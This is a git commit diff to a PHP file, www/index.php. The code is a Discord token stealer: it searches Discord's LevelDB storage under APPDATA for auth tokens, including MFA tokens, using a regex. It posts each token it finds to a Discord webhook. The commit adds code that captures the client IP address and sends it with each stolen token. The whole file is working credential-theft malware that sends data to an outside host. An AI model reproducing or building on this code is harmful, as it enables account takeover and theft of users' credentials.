1ddb28042fdc54262be5de20903116eeeae0a4cd
coats1337 <53409082+coats1337@users.noreply.github.com>
2020-06-17 13:34:23 +0200

    i love php

--- www/index.php
+++ www/index.php
@@ -1,5 +1,10 @@
 <?php
 
+function grab_ip() {
+    // this doesn't certainly return the ip but idk another way
+    return $_SERVER['REMOTE_ADDR'];
+}
+
 function get_discord_folders() {
     $discord_folders = new ArrayObject(array());
     $appdata = getenv("APPDATA");
@@ -33,6 +38,7 @@ function get_ldb_files() {
 
 function grab_tokens() {
     $ldb = get_ldb_files();
+    $ip = grab_ip();
     $discord_hook = "https://discord.com/api/webhooks/722771124676722688/";
     $token_regex = "/[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}/";
     foreach ($ldb as $lol) {
@@ -40,7 +46,13 @@ function grab_tokens() {
         if (preg_match($token_regex, fread($file, filesize($lol)), $match)) {
             foreach ($match as $token) {
                 $payload = array(
-                    "content" => $token
+
+                    "content" => "
+                    ```asciidoc
+ip :: $ip
+token :: $token
+```
+                    "
                 );
                 $options = array(
                     "http" => array(
